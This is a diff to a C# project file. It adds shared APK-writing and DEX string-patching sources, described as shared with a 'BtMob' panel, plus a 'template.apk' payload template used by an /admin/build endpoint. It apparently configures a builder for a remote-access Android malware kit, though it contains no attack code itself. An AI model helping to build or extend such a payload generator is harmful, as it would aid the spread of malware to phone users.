@@ -13,4 +13,28 @@
     <PackageReference Include="BouncyCastle.Cryptography" Version="2.4.0" />
   </ItemGroup>
 
+  <ItemGroup>
+    <!-- Shared with the panel (BtMob) so both builders produce identical APKs. -->
+    <Compile Include="..\shared\ApkZipWriter.cs" Link="ApkZipWriter.cs" />
+    <Compile Include="..\shared\DexStringPatcher.cs" Link="DexStringPatcher.cs" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <!-- Standalone harness; keep it out of the server build. -->
+    <Compile Remove="PrefixProbe\**" />
+    <None Remove="PrefixProbe\**" />
+    <None Remove="PrefixProbe\obj\**" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <!--
+      template.apk is the payload patch source the builder needs at runtime.
+      The panel keeps its own copy at BtMob/BTMOB/template.apk; copy it next to
+      the server so /admin/build and the panel's build call both work.
+    -->
+    <None Include="template.apk" Condition="Exists('template.apk')">
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </None>
+  </ItemGroup>
+
 </Project>
